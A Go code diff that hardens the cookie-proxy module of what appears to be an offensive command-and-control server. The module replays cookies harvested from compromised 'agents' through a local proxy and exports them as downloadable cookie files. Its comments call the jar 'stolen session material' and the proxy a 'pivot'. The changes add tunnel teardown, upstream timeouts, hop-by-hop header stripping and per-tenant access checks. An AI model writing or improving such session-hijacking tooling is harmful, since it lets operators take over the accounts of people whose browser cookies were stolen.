@@ -33,6 +33,41 @@ type cookieProxySession struct {
 	port     int
 	srv      *http.Server
 	started  time.Time
+
+	// tunnels tracks hijacked CONNECT connections. Closing the http.Server
+	// does not touch a hijacked connection, so without this registry a stopped
+	// proxy left every established tunnel running until the peer gave up.
+	tunnelsMu sync.Mutex
+	tunnels   map[net.Conn]struct{}
+}
+
+func (s *cookieProxySession) trackTunnel(conn net.Conn) {
+	s.tunnelsMu.Lock()
+	defer s.tunnelsMu.Unlock()
+	if s.tunnels == nil {
+		s.tunnels = make(map[net.Conn]struct{})
+	}
+	s.tunnels[conn] = struct{}{}
+}
+
+func (s *cookieProxySession) untrackTunnel(conn net.Conn) {
+	s.tunnelsMu.Lock()
+	defer s.tunnelsMu.Unlock()
+	delete(s.tunnels, conn)
+}
+
+// closeTunnels tears down every established CONNECT tunnel.
+func (s *cookieProxySession) closeTunnels() {
+	s.tunnelsMu.Lock()
+	tunnels := make([]net.Conn, 0, len(s.tunnels))
+	for c := range s.tunnels {
+		tunnels = append(tunnels, c)
+	}
+	s.tunnels = nil
+	s.tunnelsMu.Unlock()
+	for _, c := range tunnels {
+		_ = c.Close()
+	}
 }
 
 func newCookieProxyEngine() *cookieProxyEngine {
@@ -71,7 +106,7 @@ func (e *cookieProxyEngine) start(agentID string, port int) (int, error) {
 	actual := ln.Addr().(*net.TCPAddr).Port
 	sess := e.sessions[agentID]
 	if sess == nil {
-		sess = &cookieProxySession{agentID: agentID}
+		sess = &cookieProxySession{agentID: agentID, tunnels: make(map[net.Conn]struct{})}
 		e.sessions[agentID] = sess
 	}
 	sess.listener = ln
@@ -105,11 +140,49 @@ func (e *cookieProxyEngine) stop(agentID string) error {
 	if sess.listener != nil {
 		_ = sess.listener.Close()
 	}
+	// Hijacked CONNECT tunnels outlive srv.Close(), so tear them down
+	// explicitly — a stopped proxy must not keep relaying.
+	sess.closeTunnels()
 	return nil
 }
 
 type cookieProxyHandler struct {
 	sess *cookieProxySession
+}
+
+// cookieProxyTransport is the upstream transport for proxied plaintext
+// requests. http.DefaultTransport has no response-header or idle timeout, so a
+// hung target held a proxy connection (and its buffered body) open forever;
+// these bounds keep a stalled site from pinning resources.
+var cookieProxyTransport = &http.Transport{
+	Proxy:                 http.ProxyFromEnvironment,
+	DialContext:           (&net.Dialer{Timeout: 10 * time.Second, KeepAlive: 30 * time.Second}).DialContext,
+	MaxIdleConns:          32,
+	IdleConnTimeout:       30 * time.Second,
+	TLSHandshakeTimeout:   10 * time.Second,
+	ExpectContinueTimeout: 1 * time.Second,
+	ResponseHeaderTimeout: 20 * time.Second,
+}
+
+// hopByHopHeaders are per-connection headers a proxy must not forward in
+// either direction (RFC 7230 §6.1). Forwarding them corrupts the next request
+// on the same connection and leaks proxy credentials upstream.
+var hopByHopHeaders = []string{
+	"Connection",
+	"Keep-Alive",
+	"Proxy-Authenticate",
+	"Proxy-Authorization",
+	"Proxy-Connection",
+	"Te",
+	"Trailer",
+	"Transfer-Encoding",
+	"Upgrade",
+}
+
+func stripHopByHop(h http.Header) {
+	for _, name := range hopByHopHeaders {
+		h.Del(name)
+	}
 }
 
 func (h *cookieProxyHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
@@ -132,8 +205,7 @@ func (h *cookieProxyHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	out.Header = r.Header.Clone()
-	out.Header.Del("Proxy-Connection")
-	out.Header.Del("Proxy-Authorization")
+	stripHopByHop(out.Header)
 	if ck := cookieHeaderForHost(h.sess.jars, target.Host); ck != "" {
 		if existing := out.Header.Get("Cookie"); existing != "" {
 			out.Header.Set("Cookie", existing+"; "+ck)
@@ -141,12 +213,13 @@ func (h *cookieProxyHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 			out.Header.Set("Cookie", ck)
 		}
 	}
-	resp, err := http.DefaultTransport.RoundTrip(out)
+	resp, err := cookieProxyTransport.RoundTrip(out)
 	if err != nil {
 		http.Error(w, "upstream failed", http.StatusBadGateway)
 		return
 	}
 	defer resp.Body.Close()
+	stripHopByHop(resp.Header)
 	for k, vv := range resp.Header {
 		for _, v := range vv {
 			w.Header().Add(k, v)
@@ -183,6 +256,9 @@ func (h *cookieProxyHandler) handleConnect(w http.ResponseWriter, r *http.Reques
 	}
 	_, _ = bufrw.WriteString("HTTP/1.1 200 Connection Established\r\n\r\n")
 	_ = bufrw.Flush()
+	// Registered so stopping the proxy tears this tunnel down instead of
+	// leaving it relaying after the operator believes it is off.
+	h.sess.trackTunnel(conn)
 	go func() {
 		var wg sync.WaitGroup
 		wg.Go(func() {
@@ -199,6 +275,7 @@ func (h *cookieProxyHandler) handleConnect(w http.ResponseWriter, r *http.Reques
 		conn.Close()
 		wg.Wait()
 		backend.Close()
+		h.sess.untrackTunnel(conn)
 	}()
 }
 
@@ -283,6 +360,12 @@ func (s *Server) handleCookieProxyStop(c *gin.Context) {
 		respondError(c, http.StatusBadRequest, "no cookie proxy")
 		return
 	}
+	// Same tenant gate as start: without it a caller from another tenant could
+	// tear down a pivot they are not allowed to see.
+	if s.resolveVisibleAgentID(c, id) == "" {
+		respondError(c, http.StatusNotFound, "agent not found")
+		return
+	}
 	if err := s.cookieProxy.stop(id); err != nil {
 		respondErrorSafe(c, http.StatusBadRequest, err, "")
 		return
@@ -296,6 +379,10 @@ func (s *Server) handleCookieProxyStatus(c *gin.Context) {
 		return
 	}
 	id := c.Param("id")
+	if s.resolveVisibleAgentID(c, id) == "" {
+		respondError(c, http.StatusNotFound, "agent not found")
+		return
+	}
 	jars := s.loadLatestCookieJar(id)
 	n, dec := cookieJarStats(jars)
 	port := 0
@@ -319,6 +406,11 @@ func (s *Server) handleCookieProxyJar(c *gin.Context) {
 		return
 	}
 	id := c.Param("id")
+	// The jar is stolen session material: never serve another tenant's.
+	if s.resolveVisibleAgentID(c, id) == "" {
+		respondError(c, http.StatusNotFound, "agent not found")
+		return
+	}
 	jars := s.loadLatestCookieJar(id)
 	c.JSON(http.StatusOK, gin.H{"success": true, "cookies": jars, "count": len(jars)})
 }
@@ -328,6 +420,10 @@ func (s *Server) handleCookieProxyNetscape(c *gin.Context) {
 		return
 	}
 	id := c.Param("id")
+	if s.resolveVisibleAgentID(c, id) == "" {
+		respondError(c, http.StatusNotFound, "agent not found")
+		return
+	}
 	jars := s.loadLatestCookieJar(id)
 	body := netscapeCookieFile(jars)
 	c.Header("Content-Disposition", fmt.Sprintf(`attachment; filename="cookies-%s.txt"`, id))
